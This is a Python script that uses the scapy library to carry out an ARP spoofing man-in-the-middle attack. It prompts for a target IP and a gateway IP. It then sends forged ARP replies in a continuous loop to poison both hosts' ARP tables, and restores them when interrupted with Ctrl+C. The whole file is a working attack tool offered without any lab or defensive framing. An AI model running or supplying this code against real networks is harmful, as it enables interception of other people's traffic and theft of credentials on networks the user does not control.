import scapy.all as scapy
import time
import sys


#Get IP Addresses
target_ip = input("Target IP: ")
gateway_ip = input("Gateway IP: ")
print("IN ORDER TO TERMINATE PROGRAM PRESS CTRL + C. THIS WILL REVERT AND STOP THE MAN IN THE MIDDLE ATTACK.")

def get_mac(ip):
     request_arp = scapy.ARP(pdst=ip)  #Use ARP to make an object & .ARP for the target IP
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") #allow mac_destination to broadcast MAC
     request_arp_broadcast = broadcast/request_arp #Use scapy to request and broadcast arp
     answered_list = scapy.srp(request_arp_broadcast, timeout=1, verbose=False)[0] #send packets and receive responses
     return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
     mac_target = get_mac(target_ip)
     packet_arp = scapy.ARP(op=2, pdst=target_ip, hwdst=mac_target, psrc=spoof_ip)
     scapy.send(packet_arp, verbose=False) #scapy.send will shootout packets 

def restore(destination_ip, source_ip):
     mac_destination = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
     packet_arp = scapy.ARP(op=2, pdst=destination_ip, hwdst=mac_destination, psrc=source_ip, hwsrc=source_mac)
     scapy.send(packet_arp, count=4, verbose=False) #here count=4 will send out response 4x, verbose=False will use scapy.send to run in the background

try:
     sent_packets_count = 0
     while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2

except KeyboardInterrupt: 
     print("\n[-] CTRL + C : Keyboard Interruption => Putting ARP tables back as they were now...\n")
     restore(target_ip, gateway_ip)
     restore(gateway_ip, target_ip)














